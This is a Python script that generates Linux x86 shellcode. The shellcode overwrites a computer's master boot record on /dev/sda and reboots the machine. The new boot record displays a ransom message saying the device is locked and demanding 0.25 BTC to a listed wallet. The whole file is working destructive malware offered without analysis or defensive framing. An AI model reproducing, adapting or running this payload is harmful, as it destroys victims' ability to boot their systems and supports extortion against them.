#!/usr/bin/python

mbr_loader = ""
mbr_loader += "\xb8\x03\x00\xcd\x10\xb8\x00\x06\xb7\x1f\x31\xc9\xba\x4f\x18\xcd"
mbr_loader += "\x10\xbb\x31\x7c\xe8\x02\x00\xeb\xfe\x8a\x07\x08\xc0\x74\x11\xb4"
mbr_loader += "\x0e\xcd\x10\x43\xba\x40\x42\xb9\x01\x00\xb4\x86\xcd\x15\xeb\xe9"
mbr_loader += "\xc3" 

mbr_message = "Your device has been locked.\r\nAny unauthorized attempt to restore your data will lead to\r\ncomplete destruction of all information stored on your PC.\r\n\r\nIn order to unlock your device, please, send 0.25 BTC on the listed below\r\nBitcoin Wallet:\r\n1DXKL99n5xszuz7xbkM2jU8y27C5qG1Wet"

mbr_trailer = "\x00" * (510 - len(mbr_loader) - len(mbr_message)) + "\x55\xaa"

mbr = mbr_loader + mbr_message + mbr_trailer

writer = ""
writer += "\xeb\x52\x31\xc0\x5e\x31\xc0\x50\x68\x2f\x73\x64\x61\x68\x2f\x64"
writer += "\x65\x76\x89\xe3\xb9\x01\x04\x00\x00\xb8\x05\x00\x00\x00\xcd\x80"
writer += "\x89\xc3\x89\xf1\xba\x00\x02\x00\x00\xb8\x04\x00\x00\x00\xcd\x80"
writer += "\xb8\x76\x00\x00\x00\xcd\x80\xb8\x06\x00\x00\x00\xcd\x80\xbb\xad"
writer += "\xde\xe1\xfe\xb9\x69\x19\x12\x28\xba\x67\x45\x23\x01\xb8\x58\x00"
writer += "\x00\x00\xcd\x80\xe8\xa9\xff\xff\xff"
writer += mbr


shellcode = ""
for b in writer:
    shellcode += '\\x%02x' % ord(b)

print "Length: " + str(len(writer))
print '"' + shellcode + '";'